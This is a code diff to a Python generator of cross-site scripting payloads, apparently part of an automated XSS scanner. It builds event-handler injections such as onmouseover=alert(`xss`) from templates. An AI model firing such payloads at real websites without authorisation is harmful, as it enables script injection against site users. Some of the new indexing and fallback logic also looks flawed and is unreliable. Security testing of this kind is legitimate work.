@@ -48,7 +48,11 @@ BASE_PAYLOADS = {
     ],
     "INJECT_EVENT": [
         {
-            "payload": """'onmouseover=FUNCTION(`ARGS`)""",
+            "payload": """"EVENT=FUNCTION(`ARGS`)""",
+            "used_chars": ['"', "=", "`", "(", ")" , "FUNCTION", "ARGS"]
+        },
+        {
+            "payload": """'EVENT=FUNCTION(`ARGS`)""",
             "used_chars": ["'", "=", "`", "(", ")" , "FUNCTION", "ARGS"]
         },
     ]
@@ -261,33 +265,42 @@ def build_INJECT_EVENT_payload(requestModel: RequestModel, filterModel: FilterMo
     """
     Builds payloads for the INJECT_EVENT attack type
     """
-    # TODO: be able to choose ALERT or REQUEST_BIN in the building process
-
-    payloadType = PayloadType.ALERT # TODO: change this
 
     if len(failedData) == 0:
-        # take the first payload which has the expected escape char
-        for base_payload in BASE_PAYLOADS["ESCAPE_JS"]: 
-            if base_payload['used_chars'][0] == requestModel.escapeChar: payload = base_payload;break
+        if lastTestedPayload is None:
+            newIndex = 0
+        else:
+            newIndex = lastTestedPayload.referredIndex+1
+        
+        eventIndex = newIndex // len(HTML_EVENTS)
+        if newIndex >= len(BASE_PAYLOADS['INJECT_EVENT']): return
+        
+        event = HTML_EVENTS[eventIndex % len(HTML_EVENTS)]
 
+        payload = BASE_PAYLOADS['INJECT_EVENT'][newIndex]
         payload_str = f"{TEST_INPUT}{payload['payload']}EOP"
 
-        # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
+        payload_str = payload_str.replace("EVENT", event)
+
+        # TODO: generate payloads for alert and fetch 
         payload_str = payload_str.replace("FUNCTION", "alert")
         usedCharsReplaced = payload['used_chars'].copy()
         replace_list_element(usedCharsReplaced, 'FUNCTION', 'alert')
+        payloadType = PayloadType.ALERT
 
-        # TODO: mettre les arguments en fonction du type alert ou request bin
+        # TODO: set arguments in function of the type alert or request bin
         payload_str = payload_str.replace("ARGS", "xss")
         replace_list_element(usedCharsReplaced, 'ARGS', 'xss')
+        # ---------------------------------------------------------------------
 
-        payload_str = payload_str.replace("EVENT", "alert")
-        usedCharsReplaced = payload['used_chars'].copy()
-        replace_list_element(usedCharsReplaced, 'FUNCTION', 'alert')
+        return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=newIndex)
 
-        return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=0)
+    newPayload = update_payload_with_failed_data(lastTestedPayload, failedData, requestModel.escapeChar)
+    if not newPayload: 
+        failedData.clear()
+        return build_ESCAPE_HTML_payload(requestModel, failedData, lastTestedPayload, failedData)
 
-    return update_payload_with_failed_data(lastTestedPayload, failedData, requestModel.escapeChar)
+    return newPayload
 
 
 def get_payload_generator(attackType: AttackType) -> callable:
